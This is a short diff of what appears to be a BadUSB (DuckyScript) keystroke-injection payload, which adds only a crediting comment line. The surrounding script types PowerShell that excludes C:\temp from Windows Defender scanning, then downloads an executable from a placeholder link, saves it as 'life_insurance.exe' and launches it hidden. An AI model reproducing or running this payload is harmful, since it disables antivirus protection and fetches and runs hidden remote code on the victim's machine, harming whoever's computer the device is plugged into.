@@ -12,6 +12,7 @@ DELAY 2000
 STRING cd C:\; mkdir temp; cd temp; Add-MpPreference -ExclusionPath "C:\temp"
 ENTER
 DELAY 500
+REM THANK YOU FALSE PHIL. for mario head.. im a lazy mf
 STRING $down = New-Object System.Net.WebClient; $url = 'LINK_TO_EXE'; $file = 'C:\temp\life_insurance.exe'; $down.DownloadFile($url, $file); Start-Process -FilePath life_insurance.exe -WindowStyle Hidden;
 ENTER
 DELAY 5000
